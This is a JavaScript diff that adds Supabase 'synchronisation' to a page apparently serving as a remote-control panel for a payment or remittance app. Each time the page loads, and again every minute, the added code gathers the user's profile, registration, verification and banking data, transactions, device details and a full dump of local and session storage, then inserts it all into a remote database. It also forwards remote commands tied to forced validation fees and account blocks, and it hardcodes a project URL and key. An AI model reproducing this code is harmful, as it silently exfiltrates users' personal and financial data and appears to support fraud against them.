@@ -139,6 +139,481 @@
     }
   };
 
+  const DEFAULT_SUPABASE_CONFIG = {
+    url: 'https://zjbbniliprbksblevrlq.supabase.co',
+    anonKey:
+      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpqYmJuaWxpcHJia3NibGV2cmxxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk1NzA3NzQsImV4cCI6MjA3NTE0Njc3NH0.sWpZpvkaEYcExxzKQgkI5KNPGHyqF5L_Ww6BKzdwRIo'
+  };
+
+  const SUPABASE_CONFIG = (function () {
+    if (typeof window === 'undefined') {
+      return DEFAULT_SUPABASE_CONFIG;
+    }
+    const override = window.homevisaSupabaseConfig;
+    if (override && typeof override === 'object') {
+      return Object.assign({}, DEFAULT_SUPABASE_CONFIG, override);
+    }
+    return DEFAULT_SUPABASE_CONFIG;
+  })();
+
+  const SUPABASE_TABLES = {
+    snapshots: 'miinformacion_snapshots',
+    commands: 'miinformacion_remote_commands'
+  };
+
+  const supabaseStatusElements = {
+    badge: null,
+    message: null,
+    meta: null,
+    button: null
+  };
+
+  let supabaseLastStatus = {
+    badgeText: 'Inactiva',
+    message: 'La sincronización con Supabase se activará cuando haya datos disponibles.',
+    meta: '',
+    statusType: 'info'
+  };
+
+  const supabaseStats = {
+    attempts: 0,
+    successes: 0,
+    failures: 0,
+    commandsForwarded: 0,
+    commandFailures: 0
+  };
+
+  let supabaseClientPromise = null;
+  let supabaseSyncQueue = [];
+  let supabaseSyncInFlight = false;
+  let supabaseLastHash = null;
+  let supabaseLastSyncAt = null;
+  let supabaseCommandQueue = [];
+  let supabaseCommandInFlight = false;
+  const supabaseCommandsSent = new Set();
+  let lastSnapshotPayload = null;
+  let lastKnownProfile = null;
+
+  function applySupabaseStatus() {
+    const { badge, message, meta } = supabaseStatusElements;
+    const { badgeText, message: statusMessage, meta: statusMeta, statusType } = supabaseLastStatus;
+    if (badge) {
+      badge.textContent = badgeText;
+      if (statusType) {
+        badge.dataset.status = statusType;
+      } else {
+        delete badge.dataset.status;
+      }
+    }
+    if (message) {
+      message.textContent = statusMessage;
+    }
+    if (meta) {
+      const metaLabel = statusMeta && statusMeta.trim() ? statusMeta : formatSupabaseStatsMeta();
+      meta.textContent = metaLabel;
+    }
+  }
+
+  function updateSupabaseStatus(badgeText, message, meta, statusType) {
+    supabaseLastStatus = {
+      badgeText,
+      message,
+      meta: typeof meta === 'string' ? meta : '',
+      statusType: statusType || 'info'
+    };
+    applySupabaseStatus();
+  }
+
+  function formatSupabaseStatsMeta() {
+    const parts = [];
+    if (supabaseStats.attempts) {
+      parts.push(`Snapshots: ${supabaseStats.successes}/${supabaseStats.attempts} enviados`);
+      if (supabaseStats.failures) {
+        parts.push(`${supabaseStats.failures} fallos`);
+      }
+    } else {
+      parts.push('Snapshots pendientes');
+    }
+    if (supabaseStats.commandsForwarded || supabaseStats.commandFailures) {
+      const base = `Comandos: ${supabaseStats.commandsForwarded} enviados`;
+      parts.push(
+        supabaseStats.commandFailures ? `${base} · ${supabaseStats.commandFailures} fallos` : base
+      );
+    }
+    return parts.join(' • ');
+  }
+
+  function refreshSupabaseMeta() {
+    updateSupabaseStatus(
+      supabaseLastStatus.badgeText,
+      supabaseLastStatus.message,
+      formatSupabaseStatsMeta(),
+      supabaseLastStatus.statusType
+    );
+  }
+
+  function updateSupabaseButtonState() {
+    if (!supabaseStatusElements.button) return;
+    supabaseStatusElements.button.disabled = supabaseSyncInFlight;
+  }
+
+  function initSupabaseStatusUi() {
+    supabaseStatusElements.badge = document.getElementById('supabase-sync-badge');
+    supabaseStatusElements.message = document.getElementById('supabase-sync-message');
+    supabaseStatusElements.meta = document.getElementById('supabase-sync-meta');
+    supabaseStatusElements.button = document.getElementById('supabase-sync-now');
+
+    if (supabaseStatusElements.button) {
+      supabaseStatusElements.button.addEventListener('click', function (event) {
+        event.preventDefault();
+        if (supabaseSyncInFlight) {
+          return;
+        }
+        if (lastSnapshotPayload) {
+          const manualSnapshot = Object.assign({}, lastSnapshotPayload, {
+            collectedAt: new Date().toISOString()
+          });
+          queueSupabaseSnapshot(manualSnapshot, { force: true, reason: 'manual' });
+          updateSupabaseStatus(
+            'En cola',
+            'Sincronización manual solicitada.',
+            formatSupabaseStatsMeta(),
+            'info'
+          );
+        } else {
+          updateSupabaseStatus(
+            'Buscando datos',
+            'Cargando la información antes de sincronizar.',
+            formatSupabaseStatsMeta(),
+            'info'
+          );
+          refreshAll();
+        }
+      });
+    }
+
+    applySupabaseStatus();
+    updateSupabaseButtonState();
+  }
+
+  async function getSupabaseClient() {
+    if (!SUPABASE_CONFIG || !SUPABASE_CONFIG.url || !SUPABASE_CONFIG.anonKey) {
+      updateSupabaseStatus(
+        'Sin configurar',
+        'Configura la URL y clave anónima de Supabase para habilitar la sincronización.',
+        formatSupabaseStatsMeta(),
+        'error'
+      );
+      return null;
+    }
+
+    if (!supabaseClientPromise) {
+      supabaseClientPromise = import('https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm')
+        .then(({ createClient }) => {
+          return createClient(SUPABASE_CONFIG.url, SUPABASE_CONFIG.anonKey, {
+            auth: { persistSession: false }
+          });
+        })
+        .catch((error) => {
+          console.error('[MiInformación] No se pudo cargar supabase-js.', error);
+          updateSupabaseStatus(
+            'Error',
+            'No se pudo cargar el cliente de Supabase en el navegador.',
+            formatSupabaseStatsMeta(),
+            'error'
+          );
+          return null;
+        });
+    }
+
+    return supabaseClientPromise;
+  }
+
+  function computeHash(str) {
+    let hash = 0;
+    if (typeof str !== 'string' || !str.length) return hash.toString();
+    for (let i = 0; i < str.length; i += 1) {
+      const chr = str.charCodeAt(i);
+      hash = (hash << 5) - hash + chr;
+      hash |= 0; // conviértelo en un entero de 32 bits
+    }
+    return hash.toString(16);
+  }
+
+  function safeListStorageKeys(storage) {
+    const keys = [];
+    if (!storage || typeof storage.length !== 'number' || typeof storage.key !== 'function') {
+      return keys;
+    }
+    try {
+      for (let index = 0; index < storage.length; index += 1) {
+        const key = storage.key(index);
+        if (typeof key === 'string' && key) {
+          keys.push(key);
+        }
+      }
+    } catch (error) {
+      console.warn('[MiInformación] No se pudo enumerar claves de almacenamiento.', error);
+    }
+    return keys;
+  }
+
+  function gatherFullStorageDump() {
+    const dump = { localStorage: {}, sessionStorage: {} };
+    safeListStorageKeys(localStorage).forEach((key) => {
+      dump.localStorage[key] = safeGetFromStorage(localStorage, key);
+    });
+    if (typeof sessionStorage !== 'undefined') {
+      safeListStorageKeys(sessionStorage).forEach((key) => {
+        dump.sessionStorage[key] = safeGetFromStorage(sessionStorage, key);
+      });
+    }
+    return dump;
+  }
+
+  function buildSupabaseSnapshot(context) {
+    const {
+      profile,
+      registration,
+      registrationSnapshots,
+      rate,
+      balance,
+      accountInfo,
+      history,
+      sessionMonitor,
+      transactions,
+      remote,
+      sources,
+      exchangeRates
+    } = context;
+
+    const timezone = (function () {
+      try {
+        return Intl.DateTimeFormat().resolvedOptions().timeZone;
+      } catch (error) {
+        return null;
+      }
+    })();
+
+    const snapshot = {
+      collectedAt: new Date().toISOString(),
+      location: typeof window !== 'undefined' ? window.location.href : null,
+      userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : null,
+      language: typeof navigator !== 'undefined' ? navigator.language : null,
+      timezone,
+      screen:
+        typeof window !== 'undefined'
+          ? { width: window.innerWidth, height: window.innerHeight, pixelRatio: window.devicePixelRatio || 1 }
+          : null,
+      profile,
+      registration,
+      registrationSnapshots,
+      rate,
+      balance,
+      accountInfo,
+      balanceHistory: history,
+      sessionMonitor,
+      transactions,
+      remote,
+      exchangeRates,
+      storageDump: gatherFullStorageDump(),
+      sources
+    };
+
+    return snapshot;
+  }
+
+  function normalizeSnapshotForHash(snapshot) {
+    const clone = Object.assign({}, snapshot, { collectedAt: null });
+    return JSON.stringify(clone);
+  }
+
+  function queueSupabaseSnapshot(snapshot, options = {}) {
+    if (!snapshot) return;
+    try {
+      const normalized = normalizeSnapshotForHash(snapshot);
+      const hash = computeHash(normalized);
+      if (!options.force && hash === supabaseLastHash) {
+        return;
+      }
+      supabaseSyncQueue.push({ snapshot, hash });
+      if (supabaseSyncQueue.length > 10) {
+        supabaseSyncQueue = supabaseSyncQueue.slice(-10);
+      }
+      updateSupabaseStatus('En cola', 'Preparando sincronización con Supabase.', formatSupabaseStatsMeta(), 'info');
+      processSupabaseSnapshotQueue();
+    } catch (error) {
+      console.error('[MiInformación] No se pudo preparar el snapshot para Supabase.', error);
+    }
+  }
+
+  function scheduleSupabaseRetry(delayMs) {
+    const delay = Number.isFinite(delayMs) ? delayMs : 10000;
+    setTimeout(() => {
+      if (!supabaseSyncInFlight) {
+        processSupabaseSnapshotQueue();
+      }
+    }, delay);
+  }
+
+  async function processSupabaseSnapshotQueue() {
+    if (supabaseSyncInFlight) return;
+    if (!supabaseSyncQueue.length) return;
+
+    const supabase = await getSupabaseClient();
+    if (!supabase) {
+      scheduleSupabaseRetry(15000);
+      return;
+    }
+
+    supabaseSyncInFlight = true;
+    updateSupabaseButtonState();
+    updateSupabaseStatus('Sincronizando', 'Enviando datos a Supabase...', formatSupabaseStatsMeta(), 'syncing');
+
+    while (supabaseSyncQueue.length) {
+      const job = supabaseSyncQueue[0];
+      supabaseStats.attempts += 1;
+      try {
+        const payload = {
+          collected_at: job.snapshot.collectedAt,
+          device_id: job.snapshot.profile?.deviceId || null,
+          email: job.snapshot.profile?.email || null,
+          full_name:
+            job.snapshot.profile?.fullName ||
+            job.snapshot.profile?.preferredName ||
+            job.snapshot.profile?.nickname ||
+            null,
+          source: 'miinformacion',
+          data: job.snapshot,
+          last_sync_at: new Date().toISOString(),
+          location: job.snapshot.location || null
+        };
+
+        const { error } = await supabase.from(SUPABASE_TABLES.snapshots).insert(payload);
+        if (error) {
+          throw error;
+        }
+
+        supabaseStats.successes += 1;
+        supabaseLastHash = job.hash;
+        supabaseLastSyncAt = Date.now();
+        supabaseSyncQueue.shift();
+        lastSnapshotPayload = job.snapshot;
+        updateSupabaseStatus(
+          'Sincronizado',
+          supabaseLastSyncAt ? `Último envío: ${formatTimestamp(supabaseLastSyncAt)}` : 'Sincronización exitosa.',
+          formatSupabaseStatsMeta(),
+          'success'
+        );
+      } catch (error) {
+        supabaseStats.failures += 1;
+        console.error('[MiInformación] Error al enviar datos a Supabase.', error);
+        updateSupabaseStatus(
+          'Error',
+          `No se pudo enviar datos a Supabase: ${error.message || error}.`,
+          formatSupabaseStatsMeta(),
+          'error'
+        );
+        scheduleSupabaseRetry(12000);
+        break;
+      }
+    }
+
+    supabaseSyncInFlight = false;
+    updateSupabaseButtonState();
+
+    if (supabaseSyncQueue.length) {
+      scheduleSupabaseRetry(5000);
+    }
+  }
+
+  function getFallbackProfile() {
+    const registration = loadRegistration();
+    const temp = loadRegistrationTemp();
+    const userData = loadUserData();
+    const verification = loadVerificationData();
+    const banking = loadVerificationBanking();
+    return gatherProfileInfo(registration, userData, verification, banking, temp);
+  }
+
+  function queueRemoteCommandForSupabase(command) {
+    if (!command || !command.id || supabaseCommandsSent.has(command.id)) {
+      return;
+    }
+    supabaseCommandQueue.push(command);
+    if (supabaseCommandQueue.length > 25) {
+      supabaseCommandQueue = supabaseCommandQueue.slice(-25);
+    }
+    processSupabaseCommandQueue();
+  }
+
+  function scheduleSupabaseCommandRetry(delayMs) {
+    const delay = Number.isFinite(delayMs) ? delayMs : 10000;
+    setTimeout(() => {
+      if (!supabaseCommandInFlight) {
+        processSupabaseCommandQueue();
+      }
+    }, delay);
+  }
+
+  async function processSupabaseCommandQueue() {
+    if (supabaseCommandInFlight) return;
+    if (!supabaseCommandQueue.length) return;
+
+    const supabase = await getSupabaseClient();
+    if (!supabase) {
+      scheduleSupabaseCommandRetry(15000);
+      return;
+    }
+
+    supabaseCommandInFlight = true;
+
+    while (supabaseCommandQueue.length) {
+      const command = supabaseCommandQueue[0];
+      try {
+        const profile = lastKnownProfile || getFallbackProfile();
+        const payload = {
+          command_id: command.id,
+          type: command.type,
+          payload: command.payload,
+          meta: command.meta,
+          created_at: command.createdAt,
+          source: command.meta?.source || 'miinformacion',
+          device_id: profile?.deviceId || safeGetFromStorage(localStorage, 'remeexDeviceId') || null,
+          email: profile?.email || null,
+          full_name: profile?.fullName || profile?.preferredName || null
+        };
+
+        const { error } = await supabase.from(SUPABASE_TABLES.commands).insert(payload);
+        if (error) {
+          throw error;
+        }
+
+        supabaseStats.commandsForwarded += 1;
+        supabaseCommandsSent.add(command.id);
+        supabaseCommandQueue.shift();
+        refreshSupabaseMeta();
+      } catch (error) {
+        supabaseStats.commandFailures += 1;
+        console.error('[MiInformación] Error al registrar comando remoto en Supabase.', error);
+        updateSupabaseStatus(
+          supabaseLastStatus.badgeText,
+          `Error al registrar un comando remoto: ${error.message || error}.`,
+          formatSupabaseStatsMeta(),
+          'error'
+        );
+        scheduleSupabaseCommandRetry(12000);
+        break;
+      }
+    }
+
+    supabaseCommandInFlight = false;
+
+    if (supabaseCommandQueue.length) {
+      scheduleSupabaseCommandRetry(8000);
+    }
+  }
+
   let remoteFeedbackTimeout = null;
 
   const REGISTRATION_SNAPSHOT_DESCRIPTORS = [
@@ -381,6 +856,7 @@
     }
     saveRemoteCommands(filtered);
     refreshRemoteControlPanel();
+    queueRemoteCommandForSupabase(command);
     return command;
   }
 
@@ -2462,6 +2938,54 @@
     const exchangeRates = resolveExchangeRates(rate, profile.sessionRate);
     const accountInfo = resolveAccountInfo(balance, exchangeRates);
     const history = buildBalanceHistory(balanceHistoryRecords, balance, transactions, exchangeRates);
+    const remoteState = {
+      commands: loadRemoteCommands(),
+      processed: loadProcessedCommandIds(),
+      blockState: loadRemoteBlockState(),
+      validationAmount: toNumber(localStorage.getItem('forcedValidationAmountUsd')),
+      discount:
+        safeJSONParse(safeGetFromStorage(localStorage, 'validationDiscount')) ||
+        safeJSONParse(safeGetFromStorage(sessionStorage, 'validationDiscount')) ||
+        null,
+      pendingCommission: toNumber(localStorage.getItem('pendingCommission')),
+      discountExpiry:
+        safeGetFromStorage(localStorage, 'discountExpiry') ||
+        safeGetFromStorage(sessionStorage, 'discountExpiry') ||
+        null,
+      discountUsed:
+        safeGetFromStorage(localStorage, 'discountUsed') === 'true' ||
+        safeGetFromStorage(sessionStorage, 'discountUsed') === 'true'
+    };
+
+    const snapshotForSupabase = buildSupabaseSnapshot({
+      profile,
+      registration: combinedRegistration,
+      registrationSnapshots: snapshots,
+      rate,
+      balance,
+      accountInfo,
+      history,
+      sessionMonitor,
+      transactions,
+      remote: remoteState,
+      sources: {
+        registration,
+        registrationTemp,
+        userData,
+        verification,
+        banking,
+        balanceHistoryRecords,
+        sessionMonitor,
+        rate,
+        balance,
+        transactions
+      },
+      exchangeRates
+    });
+
+    lastSnapshotPayload = snapshotForSupabase;
+    lastKnownProfile = profile;
+    queueSupabaseSnapshot(snapshotForSupabase);
 
     renderProfile(profile);
     renderRegistration(combinedRegistration, Boolean(registration));
@@ -2475,10 +2999,10 @@
     renderRemoteControlPanel({
       balance,
       rate,
-      commands: loadRemoteCommands(),
-      processed: loadProcessedCommandIds(),
-      blockState: loadRemoteBlockState(),
-      validationAmount: toNumber(localStorage.getItem('forcedValidationAmountUsd'))
+      commands: remoteState.commands,
+      processed: remoteState.processed,
+      blockState: remoteState.blockState,
+      validationAmount: remoteState.validationAmount
     });
   }
 
@@ -2492,6 +3016,7 @@
   }
 
   document.addEventListener('DOMContentLoaded', function () {
+    initSupabaseStatusUi();
     initRemoteControls();
     refreshAll();
     setInterval(refreshAll, 60000);
